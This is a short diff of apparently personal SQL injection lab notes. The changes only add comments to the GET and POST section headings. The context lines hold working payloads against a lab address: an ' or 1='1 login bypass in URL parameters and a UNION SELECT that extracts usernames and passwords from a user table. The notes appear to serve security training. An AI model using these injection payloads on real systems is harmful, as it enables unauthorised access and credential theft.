@@ -40,7 +40,7 @@ password=password' or 1='1
 http://10.50.21.1/login.php?username=matt'+or+1='1&passwd=password'+or+1='1
 #find the field and how they spell them in console tab > network> request after sending the or password
 
-#SQL injection - POST method
+#SQL injection - POST method  ##some type of text box inside website
 0. Determine normalbehavior
 Only valid entries will provide information
 
@@ -90,7 +90,7 @@ table_schema  null        table_name  column_name  1
 <value>' UNION select studentID,null,username,passwd,null from session.userinfo; #
 
 
-#SQL injection - GET method
+#SQL injection - GET method  ##URL
 0. Determine the normal behavior
 Goodyear
 http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
